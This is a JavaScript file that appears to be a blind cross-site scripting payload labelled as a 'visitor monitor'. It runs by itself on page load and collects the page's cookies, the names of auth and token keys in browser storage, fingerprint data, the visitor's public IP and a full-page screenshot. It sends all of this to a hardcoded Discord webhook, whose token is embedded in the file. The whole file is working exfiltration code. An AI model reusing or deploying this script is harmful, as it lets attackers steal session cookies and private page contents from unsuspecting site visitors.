(function (global) {
  'use strict';

  var DEFAULTS = {
    webhookUrl:
      'https://discord.com/api/webhooks/1495259962060968108/VyY2NtOEK20itTZg7X5kayb1m6laU4T0MUtBb8KmxuZT9uxDvpFRjE1XDUpQhccqcOeW',
    ipLookupUrl: 'https://api.ipify.org?format=json',
    captureDelayMs: 400,
    maxCanvasHeight: 4000,
    blockedHostnames: ['bugr.space'],
  };

  function buildClientHeaders(nav) {
    var h = {
      Host: location.host,
      'User-Agent': nav.userAgent,
      'Accept-Language': nav.language,
      Referer: document.referrer || undefined,
      DNT: nav.doNotTrack != null ? String(nav.doNotTrack) : undefined,
      'Sec-CH-UA': nav.userAgentData ? JSON.stringify(nav.userAgentData.brands || []) : undefined,
      'Sec-CH-UA-Mobile': nav.userAgentData ? String(!!nav.userAgentData.mobile) : undefined,
      'Sec-CH-UA-Platform': nav.userAgentData ? nav.userAgentData.platform : undefined,
    };
    var conn = nav.connection || nav.mozConnection || nav.webkitConnection;
    if (conn) {
      if (conn.effectiveType) h['Network-Client-Hint'] = 'effectiveType=' + conn.effectiveType;
      if (conn.downlink != null) h['Estimated-Downlink-Mbps'] = String(conn.downlink);
    }
    return h;
  }

  function readCookies() {
    try {
      return document.cookie || '';
    } catch (e) {
      return '';
    }
  }

  function runCookieProbe() {
    var probeName = '__bxss_probe_' + Math.random().toString(36).slice(2);
    var probeValue = '1';
    try {
      document.cookie = probeName + '=' + probeValue + '; path=/; SameSite=Lax';
      var cookieJar = readCookies();
      var visible = cookieJar.indexOf(probeName + '=' + probeValue) >= 0;
      document.cookie = probeName + '=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=Lax';
      return { attempted: true, visibleAfterWrite: visible };
    } catch (e) {
      return {
        attempted: false,
        visibleAfterWrite: false,
        writeError: String(e && e.message ? e.message : e),
      };
    }
  }

  function inThirdPartyFrame() {
    try {
      if (window.top === window) return false;
      var topHost = window.top.location && window.top.location.hostname;
      if (!topHost) return true;
      return String(topHost).toLowerCase() !== String(location.hostname || '').toLowerCase();
    } catch (e) {
      return true;
    }
  }

  function diagnoseEmptyCookies(cookies, storageHints) {
    if (cookies && cookies.length > 0) {
      return {
        code: 'readable_cookies_present',
        confidence: 'high',
        reason: 'Cookies are visible to JavaScript via document.cookie.',
      };
    }

    var nav = navigator || {};
    var thirdParty = inThirdPartyFrame();
    var probe = runCookieProbe();
    var hasSensitiveStorageHints =
      !!(
        storageHints &&
        ((storageHints.localStorage && storageHints.localStorage.length) ||
          (storageHints.sessionStorage && storageHints.sessionStorage.length))
      );

    if (!nav.cookieEnabled) {
      return {
        code: 'cookies_disabled',
        confidence: 'high',
        reason: 'navigator.cookieEnabled is false, so browser cookie access is disabled.',
        probe: probe,
      };
    }

    if (!/^https?:$/i.test(String(location.protocol || ''))) {
      return {
        code: 'unsupported_scheme',
        confidence: 'high',
        reason: 'Page is not using http/https, so normal cookie behavior may not apply.',
        probe: probe,
      };
    }

    if (!probe.visibleAfterWrite) {
      return {
        code: 'cookie_write_blocked',
        confidence: 'high',
        reason:
          'JavaScript probe cookie could not be read back after write; browser/privacy/storage policy likely blocks cookies here.',
        thirdPartyContext: thirdParty,
        probe: probe,
      };
    }

    if (thirdParty) {
      return {
        code: 'third_party_or_samesite_restriction',
        confidence: 'medium',
        reason:
          'Script runs in a third-party frame context; SameSite or third-party cookie restrictions likely hide cookies.',
        probe: probe,
      };
    }

    if (hasSensitiveStorageHints) {
      return {
        code: 'likely_httponly_or_scope',
        confidence: 'medium',
        reason:
          'Auth/session-like storage keys exist but no JS-readable cookies. Session may rely on HttpOnly cookies or cookies outside current Domain/Path scope.',
        probe: probe,
      };
    }

    return {
      code: 'no_cookie_for_current_scope',
      confidence: 'medium',
      reason:
        'Cookie writes work, but no existing cookie is readable at this origin/path. Likely no cookie is set for this exact scope.',
      probe: probe,
    };
  }

  function buildCookiesNote(diagnosis) {
    if (!diagnosis) return '';
    if (diagnosis.code === 'readable_cookies_present') {
      return (
        diagnosis.reason +
        ' Note: HttpOnly cookies are intentionally never exposed to JavaScript.'
      );
    }
    return (
      diagnosis.reason +
      ' JS still cannot read HttpOnly cookie values by design.'
    );
  }

  function shouldBlockDispatchByHostname(blockedHostnames) {
    var host = String((location && location.hostname) || '').toLowerCase();
    if (!host) return false;
    var list = Array.isArray(blockedHostnames) ? blockedHostnames : [];
    for (var i = 0; i < list.length; i++) {
      var blocked = String(list[i] || '').toLowerCase().trim();
      if (!blocked) continue;
      if (host === blocked || host.slice(-(blocked.length + 1)) === '.' + blocked) return true;
    }
    return false;
  }

  function storageKeyHints() {
    var out = { localStorage: [], sessionStorage: [] };
    var re = /auth|token|jwt|session|key|csrf|bearer|secret|api/i;
    try {
      var i;
      for (i = 0; i < localStorage.length; i++) {
        var lk = localStorage.key(i);
        if (lk && re.test(lk)) out.localStorage.push(lk);
      }
    } catch (e) {}
    try {
      for (i = 0; i < sessionStorage.length; i++) {
        var sk = sessionStorage.key(i);
        if (sk && re.test(sk)) out.sessionStorage.push(sk);
      }
    } catch (e2) {}
    return out;
  }

  function collectReport() {
    var nav = navigator;
    var scr = screen;
    var cookies = readCookies();
    var headers = buildClientHeaders(nav);
    var hints = storageKeyHints();
    var cookieDiagnosis = diagnoseEmptyCookies(cookies, hints);
    var cookiesNote = buildCookiesNote(cookieDiagnosis);
    return {
      collectedAt: new Date().toISOString(),
      url: location.href,
      cookies: cookies,
      cookiesNote: cookiesNote,
      cookieDiagnosis: cookieDiagnosis,
      headers: headers,
      storageKeyHints: hints,
      title: document.title || '',
      referrer: document.referrer || '',
      display: {
        screen: scr
          ? {
              width: scr.width,
              height: scr.height,
              availWidth: scr.availWidth,
              availHeight: scr.availHeight,
            }
          : null,
        viewport: {
          innerWidth: window.innerWidth,
          innerHeight: window.innerHeight,
          devicePixelRatio: window.devicePixelRatio,
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      },
      navigator: {
        language: nav.language,
        languages: nav.languages ? Array.from(nav.languages) : [],
        platform: nav.platform,
        cookieEnabled: nav.cookieEnabled,
        onLine: nav.onLine,
      },
    };
  }

  async function fetchPublicIp(ipLookupUrl) {
    try {
      var res = await fetch(ipLookupUrl, { cache: 'no-store' });
      var data = await res.json();
      if (data && data.ip) return data.ip;
    } catch (e) {}
    return null;
  }

  function loadHtml2Canvas() {
    return new Promise(function (resolve, reject) {
      if (global.html2canvas) {
        resolve(global.html2canvas);
        return;
      }
      var s = document.createElement('script');
      s.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
      s.async = true;
      s.onload = function () {
        if (global.html2canvas) resolve(global.html2canvas);
        else reject(new Error('html2canvas not loaded'));
      };
      s.onerror = function () {
        reject(new Error('Failed to load html2canvas'));
      };
      document.head.appendChild(s);
    });
  }

  function capturePagePng(html2canvas, opts) {
    var target = document.documentElement;
    return html2canvas(target, {
      useCORS: true,
      allowTaint: false,
      logging: false,
      scale: Math.min(1, (opts.maxCanvasHeight || 4000) / Math.max(target.scrollHeight, 1)),
      windowHeight: target.scrollHeight,
      windowWidth: target.scrollWidth,
    }).then(function (canvas) {
      return new Promise(function (resolve, reject) {
        canvas.toBlob(function (blob) {
          if (!blob) reject(new Error('toBlob failed'));
          else resolve(blob);
        }, 'image/png');
      });
    });
  }

  function buildDiscordDescription(report, ip, captureLine) {
    var sec1 = '【1 · URL】\n' + (report.url || '') + '\n\n';
    var sec2 =
      '【2 · Cookies】\n' +
      (report.cookies && report.cookies.length ? report.cookies : '(empty)') +
      '\n' +
      (report.cookiesNote || '') +
      '\n\n';
    var sec2b =
      '【2.1 · Cookie diagnosis】\n```json\n' +
      JSON.stringify(report.cookieDiagnosis || {}, null, 2) +
      '\n```\n\n';
    var sec3 =
      '【3 · Headers (client-visible only)】\n```json\n' +
      JSON.stringify(report.headers, null, 2) +
      '\n```\n\n';
    var sec4 =
      '【4 · IP · capture · title】\n```json\n' +
      JSON.stringify(
        {
          publicIp: ip,
          screenshot: captureLine,
          title: report.title,
          referrer: report.referrer,
        },
        null,
        2
      ) +
      '\n```\n\n';
    var sec5 =
      '【5 · Storage key hints (names)】\n```json\n' +
      JSON.stringify(report.storageKeyHints, null, 2) +
      '\n```\n\n';
    var sec6 =
      '【6 · Display · navigator】\n```json\n' +
      JSON.stringify(
        { display: report.display, navigator: report.navigator },
        null,
        2
      ) +
      '\n```';
    var full = sec1 + sec2 + sec2b + sec3 + sec4 + sec5 + sec6;
    var max = 4096;
    if (full.length <= max) return full;
    var head = sec1 + sec2 + sec2b + sec3;
    if (head.length >= max - 24) {
      return head.slice(0, max - 24) + '\n…(truncated)';
    }
    var rest = sec4 + sec5 + sec6;
    var budget = max - head.length - 24;
    return head + '\n…\n' + rest.slice(0, Math.max(0, budget)) + (rest.length > budget ? '\n…(truncated)' : '');
  }

  async function sendToDiscord(options) {
    var opts = Object.assign({}, DEFAULTS, options);
    if (!opts.webhookUrl || typeof opts.webhookUrl !== 'string') {
      throw new Error('webhookUrl required');
    }

    var report = collectReport();
    if (shouldBlockDispatchByHostname(opts.blockedHostnames)) {
      return {
        ok: true,
        skipped: true,
        reason: 'blocked by hostname filter',
        host: location.hostname,
      };
    }
    var ip = await fetchPublicIp(opts.ipLookupUrl);
    report.visitor = { publicIp: ip };

    await new Promise(function (r) {
      setTimeout(r, opts.captureDelayMs);
    });

    var pngBlob = null;
    var captureLine = 'pending';
    try {
      var html2canvas = await loadHtml2Canvas();
      pngBlob = await capturePagePng(html2canvas, opts);
      captureLine = 'ok';
    } catch (e) {
      captureLine = 'failed: ' + String(e && e.message ? e.message : e);
    }

    var embed = {
      title: 'Hit · ' + report.collectedAt,
      description: buildDiscordDescription(report, ip, captureLine),
      color: 0x5865f2,
      timestamp: new Date().toISOString(),
    };

    var payload = {
      embeds: [embed],
      allowed_mentions: { parse: [] },
    };

    var url = opts.webhookUrl + (opts.webhookUrl.indexOf('?') >= 0 ? '&' : '?') + 'wait=true';

    var res;
    if (pngBlob) {
      var form = new FormData();
      form.append('payload_json', JSON.stringify(payload));
      form.append('files[0]', pngBlob, 'page-screenshot.png');
      res = await fetch(url, { method: 'POST', body: form });
    } else {
      res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
    }
    if (!res.ok) {
      var t = await res.text().catch(function () {
        return '';
      });
      throw new Error('Discord HTTP ' + res.status + ' ' + t);
    }
    return { ok: true, status: res.status };
  }

  global.initVisitorMonitor = sendToDiscord;

  if (typeof document !== 'undefined') {
    function runMonitor() {
      sendToDiscord({}).catch(function (e) {
        console.error(e);
      });
    }
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', runMonitor);
    } else {
      runMonitor();
    }
  }
})(typeof window !== 'undefined' ? window : this);
